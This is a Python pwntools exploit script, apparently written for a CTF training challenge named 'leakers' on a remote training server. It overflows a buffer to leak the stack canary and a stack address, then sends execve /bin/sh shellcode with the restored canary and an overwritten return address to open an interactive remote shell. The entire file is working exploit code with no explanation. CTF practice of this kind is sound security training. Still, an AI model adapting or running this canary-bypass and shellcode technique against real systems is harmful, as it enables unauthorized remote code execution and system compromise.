from pwn import *
import time

#context.terminal = ['tmux','splitw','-h']

#r = process("./leakers")
r = remote("bin.training.jinblack.it", 2011)
#gdb.attach(r, gdbscript="""
 #   b *0x00401255
  # """)
       
#input("wait")
shellcode = b"\xEB\x0E\x48\x31\xC0\xB0\x3B\x5F\x48\x31\xF6\x48\x31\xD2\x0F\x05\xE8\xED\xFF\xFF\xFF/bin/sh\x00"
#shellcode = b"\x90\x90\x90\x90\x90\x90\x90\x90\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00\x00"
#r.send(shellcode)
r.send("A"*105)
time.sleep(1)
r.recvuntil(b"> ")
r.recv(105)
canary = u64(b"\x00"+r.recv(7))
print("canary: %#x" % canary)
r.send("A"*(104+4*8))
time.sleep(1)
r.recvuntil(b"> ")
r.recv(104+4*8)
stack = u64(r.recv(6) + b"\x00\x00" )
stack = stack - 0x158
print("stack: %#x" % stack)
payload = shellcode.ljust(104, b"\x90") + p64(canary) + b"D"*8 + p64(stack)
r.send(payload)
time.sleep(1)
r.send(b"\n")
r.interactive()